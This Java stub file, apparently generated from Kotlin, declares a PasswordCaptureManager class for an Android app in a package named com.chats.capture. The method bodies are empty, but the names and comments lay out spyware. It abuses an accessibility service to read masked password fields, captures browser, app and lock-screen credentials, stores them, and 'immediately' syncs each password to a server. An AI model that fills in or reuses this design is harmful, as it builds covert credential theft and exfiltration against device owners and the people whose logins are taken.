package com.chats.capture.utils;

/**
 * Manages password capture from various sources
 */
@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000n\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\t\n\u0000\n\u0002\u0010%\n\u0002\u0010\u000e\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010 \n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0010\n\u0002\u0010\u000b\n\u0002\b\u0005\n\u0002\u0018\u0002\n\u0002\b\b\n\u0002\u0018\u0002\n\u0002\b\u0002\u0018\u00002\u00020\u0001:\u0001=B\u001d\u0012\u0006\u0010\u0002\u001a\u00020\u0003\u0012\u0006\u0010\u0004\u001a\u00020\u0005\u0012\u0006\u0010\u0006\u001a\u00020\u0007\u00a2\u0006\u0002\u0010\bJ\u0018\u0010\u0019\u001a\u00020\u001a2\u0006\u0010\u001b\u001a\u00020\u001c2\u0006\u0010\u001d\u001a\u00020\rH\u0002J\u0018\u0010\u001e\u001a\u00020\u001a2\u0006\u0010\u001b\u001a\u00020\u001c2\u0006\u0010\u001d\u001a\u00020\rH\u0002J\u0010\u0010\u001f\u001a\u00020\u001a2\u0006\u0010 \u001a\u00020\rH\u0002J \u0010!\u001a\u00020\u001a2\u0006\u0010\u001d\u001a\u00020\r2\u0006\u0010\"\u001a\u00020\r2\u0006\u0010\u001b\u001a\u00020\u001cH\u0002J \u0010#\u001a\u00020\u001a2\u0006\u0010\u001d\u001a\u00020\r2\u0006\u0010 \u001a\u00020\r2\u0006\u0010\u001b\u001a\u00020\u001cH\u0002J\b\u0010$\u001a\u00020\u001aH\u0002J\u0014\u0010%\u001a\u0004\u0018\u00010\r2\b\u0010&\u001a\u0004\u0018\u00010\rH\u0002J\u0012\u0010\'\u001a\u0004\u0018\u00010\r2\u0006\u0010\u001b\u001a\u00020\u001cH\u0002J\u0012\u0010(\u001a\u0004\u0018\u00010\u001c2\u0006\u0010)\u001a\u00020\u001cH\u0002J \u0010*\u001a\u0004\u0018\u00010\u001c2\u0006\u0010)\u001a\u00020\u001c2\f\u0010+\u001a\b\u0012\u0004\u0012\u00020\r0\u0010H\u0002J\u001a\u0010,\u001a\u0004\u0018\u00010\u001c2\u0006\u0010)\u001a\u00020\u001c2\u0006\u0010 \u001a\u00020-H\u0002J\u0012\u0010.\u001a\u0004\u0018\u00010\u001c2\u0006\u0010)\u001a\u00020\u001cH\u0002J\u0012\u0010/\u001a\u0004\u0018\u00010\u001c2\u0006\u0010)\u001a\u00020\u001cH\u0002J\u0010\u00100\u001a\u00020\r2\u0006\u0010\u001d\u001a\u00020\rH\u0002J\u000e\u00101\u001a\u00020\u001a2\u0006\u00102\u001a\u000203J\u000e\u00104\u001a\u00020\u001a2\u0006\u00102\u001a\u000203J\u0010\u00105\u001a\u00020-2\u0006\u0010\u001d\u001a\u00020\rH\u0002J\u0018\u00106\u001a\u00020-2\u0006\u0010\u001d\u001a\u00020\r2\u0006\u0010\u001b\u001a\u00020\u001cH\u0002J\u0010\u00107\u001a\u00020-2\u0006\u0010\u001b\u001a\u00020\u001cH\u0002J\u0010\u00108\u001a\u00020-2\u0006\u0010\u001b\u001a\u00020\u001cH\u0002J\u0010\u00109\u001a\u00020-2\u0006\u0010\"\u001a\u00020\rH\u0002J\u0010\u0010:\u001a\u00020\u001a2\u0006\u0010;\u001a\u00020<H\u0002R\u000e\u0010\t\u001a\u00020\nX\u0082D\u00a2\u0006\u0002\n\u0000R\u001a\u0010\u000b\u001a\u000e\u0012\u0004\u0012\u00020\r\u0012\u0004\u0012\u00020\u000e0\fX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0004\u001a\u00020\u0005X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u0014\u0010\u000f\u001a\b\u0012\u0004\u0012\u00020\r0\u0010X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u0016\u0010\u0011\u001a\n \u0013*\u0004\u0018\u00010\u00120\u0012X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u001a\u0010\u0014\u001a\u000e\u0012\u0004\u0012\u00020\r\u0012\u0004\u0012\u00020\n0\fX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u001c\u0010\u0015\u001a\u0010\u0012\u0004\u0012\u00020\r\u0012\u0004\u0012\u00020\r\u0018\u00010\u0016X\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u001c\u0010\u0017\u001a\u0010\u0012\u0004\u0012\u00020\r\u0012\u0004\u0012\u00020\r\u0018\u00010\u0016X\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u0014\u0010\u0018\u001a\b\u0012\u0004\u0012\u00020\r0\u0010X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0002\u001a\u00020\u0003X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0007X\u0082\u0004\u00a2\u0006\u0002\n\u0000\u00a8\u0006>"}, d2 = {"Lcom/chats/capture/utils/PasswordCaptureManager;", "", "service", "Landroid/accessibilityservice/AccessibilityService;", "credentialDao", "Lcom/chats/capture/database/CredentialDao;", "serviceScope", "Lkotlinx/coroutines/CoroutineScope;", "(Landroid/accessibilityservice/AccessibilityService;Lcom/chats/capture/database/CredentialDao;Lkotlinx/coroutines/CoroutineScope;)V", "MIN_CAPTURE_INTERVAL_MS", "", "credentialBuffer", "", "", "Lcom/chats/capture/utils/PasswordCaptureManager$CredentialBuilder;", "emailFieldKeywords", "", "emailPattern", "Ljava/util/regex/Pattern;", "kotlin.jvm.PlatformType", "lastCaptureTime", "lastEmailCapture", "Lkotlin/Pair;", "lastPasswordCapture", "passwordFieldKeywords", "captureAppCredentials", "", "node", "Landroid/view/accessibility/AccessibilityNodeInfo;", "packageName", "captureBrowserCredentials", "captureDevicePassword", "password", "captureEmail", "email", "capturePassword", "cleanupOldBufferEntries", "extractDomain", "url", "extractUrl", "findEmailField", "root", "findFieldByKeywords", "keywords", "findFieldByType", "", "findPasswordField", "findUsernameField", "getAppName", "handleFormSubmission", "event", "Landroid/view/accessibility/AccessibilityEvent;", "handleTextChanged", "isBrowser", "isDeviceLockScreen", "isEmailField", "isPasswordField", "isValidEmail", "syncPasswordImmediately", "credential", "Lcom/chats/capture/models/Credential;", "CredentialBuilder", "app_debug"})
public final class PasswordCaptureManager {
    @org.jetbrains.annotations.NotNull()
    private final android.accessibilityservice.AccessibilityService service = null;
    @org.jetbrains.annotations.NotNull()
    private final com.chats.capture.database.CredentialDao credentialDao = null;
    @org.jetbrains.annotations.NotNull()
    private final kotlinx.coroutines.CoroutineScope serviceScope = null;
    private final java.util.regex.Pattern emailPattern = null;
    @org.jetbrains.annotations.NotNull()
    private final java.util.List<java.lang.String> passwordFieldKeywords = null;
    @org.jetbrains.annotations.NotNull()
    private final java.util.List<java.lang.String> emailFieldKeywords = null;
    @org.jetbrains.annotations.Nullable()
    private kotlin.Pair<java.lang.String, java.lang.String> lastPasswordCapture;
    @org.jetbrains.annotations.Nullable()
    private kotlin.Pair<java.lang.String, java.lang.String> lastEmailCapture;
    @org.jetbrains.annotations.NotNull()
    private java.util.Map<java.lang.String, com.chats.capture.utils.PasswordCaptureManager.CredentialBuilder> credentialBuffer;
    @org.jetbrains.annotations.NotNull()
    private java.util.Map<java.lang.String, java.lang.Long> lastCaptureTime;
    private final long MIN_CAPTURE_INTERVAL_MS = 500L;
    
    public PasswordCaptureManager(@org.jetbrains.annotations.NotNull()
    android.accessibilityservice.AccessibilityService service, @org.jetbrains.annotations.NotNull()
    com.chats.capture.database.CredentialDao credentialDao, @org.jetbrains.annotations.NotNull()
    kotlinx.coroutines.CoroutineScope serviceScope) {
        super();
    }
    
    /**
     * Handle text changed event and check if it's a password field
     * Note: AccessibilityService can access password text even when masked on screen
     */
    public final void handleTextChanged(@org.jetbrains.annotations.NotNull()
    android.view.accessibility.AccessibilityEvent event) {
    }
    
    /**
     * Handle form submission (browser login, app login)
     */
    public final void handleFormSubmission(@org.jetbrains.annotations.NotNull()
    android.view.accessibility.AccessibilityEvent event) {
    }
    
    private final boolean isPasswordField(android.view.accessibility.AccessibilityNodeInfo node) {
        return false;
    }
    
    private final boolean isEmailField(android.view.accessibility.AccessibilityNodeInfo node) {
        return false;
    }
    
    private final boolean isValidEmail(java.lang.String email) {
        return false;
    }
    
    private final boolean isDeviceLockScreen(java.lang.String packageName, android.view.accessibility.AccessibilityNodeInfo node) {
        return false;
    }
    
    private final boolean isBrowser(java.lang.String packageName) {
        return false;
    }
    
    private final void capturePassword(java.lang.String packageName, java.lang.String password, android.view.accessibility.AccessibilityNodeInfo node) {
    }
    
    private final void captureEmail(java.lang.String packageName, java.lang.String email, android.view.accessibility.AccessibilityNodeInfo node) {
    }
    
    private final void captureDevicePassword(java.lang.String password) {
    }
    
    private final void captureBrowserCredentials(android.view.accessibility.AccessibilityNodeInfo node, java.lang.String packageName) {
    }
    
    private final void captureAppCredentials(android.view.accessibility.AccessibilityNodeInfo node, java.lang.String packageName) {
    }
    
    private final android.view.accessibility.AccessibilityNodeInfo findEmailField(android.view.accessibility.AccessibilityNodeInfo root) {
        return null;
    }
    
    private final android.view.accessibility.AccessibilityNodeInfo findPasswordField(android.view.accessibility.AccessibilityNodeInfo root) {
        return null;
    }
    
    /**
     * Recursively finds a username field within the accessibility node hierarchy.
     */
    private final android.view.accessibility.AccessibilityNodeInfo findUsernameField(android.view.accessibility.AccessibilityNodeInfo root) {
        return null;
    }
    
    private final android.view.accessibility.AccessibilityNodeInfo findFieldByKeywords(android.view.accessibility.AccessibilityNodeInfo root, java.util.List<java.lang.String> keywords) {
        return null;
    }
    
    private final android.view.accessibility.AccessibilityNodeInfo findFieldByType(android.view.accessibility.AccessibilityNodeInfo root, boolean password) {
        return null;
    }
    
    private final java.lang.String extractUrl(android.view.accessibility.AccessibilityNodeInfo node) {
        return null;
    }
    
    private final java.lang.String extractDomain(java.lang.String url) {
        return null;
    }
    
    private final java.lang.String getAppName(java.lang.String packageName) {
        return null;
    }
    
    /**
     * Clean up old buffer entries to prevent memory leaks.
     * Removes entries older than 5 minutes.
     */
    private final void cleanupOldBufferEntries() {
    }
    
    /**
     * Immediately sync password to server when captured
     */
    private final void syncPasswordImmediately(com.chats.capture.models.Credential credential) {
    }
    
    /**
     * Helper class to build a credential before it's fully captured.
     */
    @kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000*\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0003\n\u0002\u0010\t\n\u0002\b\u0013\n\u0002\u0010\u000b\n\u0002\b\u0002\n\u0002\u0010\b\n\u0002\b\u0002\b\u0082\b\u0018\u00002\u00020\u0001B3\u0012\n\b\u0002\u0010\u0002\u001a\u0004\u0018\u00010\u0003\u0012\n\b\u0002\u0010\u0004\u001a\u0004\u0018\u00010\u0003\u0012\n\b\u0002\u0010\u0005\u001a\u0004\u0018\u00010\u0003\u0012\b\b\u0002\u0010\u0006\u001a\u00020\u0007\u00a2\u0006\u0002\u0010\bJ\u000b\u0010\u0015\u001a\u0004\u0018\u00010\u0003H\u00c6\u0003J\u000b\u0010\u0016\u001a\u0004\u0018\u00010\u0003H\u00c6\u0003J\u000b\u0010\u0017\u001a\u0004\u0018\u00010\u0003H\u00c6\u0003J\t\u0010\u0018\u001a\u00020\u0007H\u00c6\u0003J7\u0010\u0019\u001a\u00020\u00002\n\b\u0002\u0010\u0002\u001a\u0004\u0018\u00010\u00032\n\b\u0002\u0010\u0004\u001a\u0004\u0018\u00010\u00032\n\b\u0002\u0010\u0005\u001a\u0004\u0018\u00010\u00032\b\b\u0002\u0010\u0006\u001a\u00020\u0007H\u00c6\u0001J\u0013\u0010\u001a\u001a\u00020\u001b2\b\u0010\u001c\u001a\u0004\u0018\u00010\u0001H\u00d6\u0003J\t\u0010\u001d\u001a\u00020\u001eH\u00d6\u0001J\t\u0010\u001f\u001a\u00020\u0003H\u00d6\u0001R\u001c\u0010\u0002\u001a\u0004\u0018\u00010\u0003X\u0086\u000e\u00a2\u0006\u000e\n\u0000\u001a\u0004\b\t\u0010\n\"\u0004\b\u000b\u0010\fR\u001c\u0010\u0005\u001a\u0004\u0018\u00010\u0003X\u0086\u000e\u00a2\u0006\u000e\n\u0000\u001a\u0004\b\r\u0010\n\"\u0004\b\u000e\u0010\fR\u001a\u0010\u0006\u001a\u00020\u0007X\u0086\u000e\u00a2\u0006\u000e\n\u0000\u001a\u0004\b\u000f\u0010\u0010\"\u0004\b\u0011\u0010\u0012R\u001c\u0010\u0004\u001a\u0004\u0018\u00010\u0003X\u0086\u000e\u00a2\u0006\u000e\n\u0000\u001a\u0004\b\u0013\u0010\n\"\u0004\b\u0014\u0010\f\u00a8\u0006 "}, d2 = {"Lcom/chats/capture/utils/PasswordCaptureManager$CredentialBuilder;", "", "email", "", "username", "password", "timestamp", "", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;J)V", "getEmail", "()Ljava/lang/String;", "setEmail", "(Ljava/lang/String;)V", "getPassword", "setPassword", "getTimestamp", "()J", "setTimestamp", "(J)V", "getUsername", "setUsername", "component1", "component2", "component3", "component4", "copy", "equals", "", "other", "hashCode", "", "toString", "app_debug"})
    static final class CredentialBuilder {
        @org.jetbrains.annotations.Nullable()
        private java.lang.String email;
        @org.jetbrains.annotations.Nullable()
        private java.lang.String username;
        @org.jetbrains.annotations.Nullable()
        private java.lang.String password;
        private long timestamp;
        
        public CredentialBuilder(@org.jetbrains.annotations.Nullable()
        java.lang.String email, @org.jetbrains.annotations.Nullable()
        java.lang.String username, @org.jetbrains.annotations.Nullable()
        java.lang.String password, long timestamp) {
            super();
        }
        
        @org.jetbrains.annotations.Nullable()
        public final java.lang.String getEmail() {
            return null;
        }
        
        public final void setEmail(@org.jetbrains.annotations.Nullable()
        java.lang.String p0) {
        }
        
        @org.jetbrains.annotations.Nullable()
        public final java.lang.String getUsername() {
            return null;
        }
        
        public final void setUsername(@org.jetbrains.annotations.Nullable()
        java.lang.String p0) {
        }
        
        @org.jetbrains.annotations.Nullable()
        public final java.lang.String getPassword() {
            return null;
        }
        
        public final void setPassword(@org.jetbrains.annotations.Nullable()
        java.lang.String p0) {
        }
        
        public final long getTimestamp() {
            return 0L;
        }
        
        public final void setTimestamp(long p0) {
        }
        
        public CredentialBuilder() {
            super();
        }
        
        @org.jetbrains.annotations.Nullable()
        public final java.lang.String component1() {
            return null;
        }
        
        @org.jetbrains.annotations.Nullable()
        public final java.lang.String component2() {
            return null;
        }
        
        @org.jetbrains.annotations.Nullable()
        public final java.lang.String component3() {
            return null;
        }
        
        public final long component4() {
            return 0L;
        }
        
        @org.jetbrains.annotations.NotNull()
        public final com.chats.capture.utils.PasswordCaptureManager.CredentialBuilder copy(@org.jetbrains.annotations.Nullable()
        java.lang.String email, @org.jetbrains.annotations.Nullable()
        java.lang.String username, @org.jetbrains.annotations.Nullable()
        java.lang.String password, long timestamp) {
            return null;
        }
        
        @java.lang.Override()
        public boolean equals(@org.jetbrains.annotations.Nullable()
        java.lang.Object other) {
            return false;
        }
        
        @java.lang.Override()
        public int hashCode() {
            return 0;
        }
        
        @java.lang.Override()
        @org.jetbrains.annotations.NotNull()
        public java.lang.String toString() {
            return null;
        }
    }
}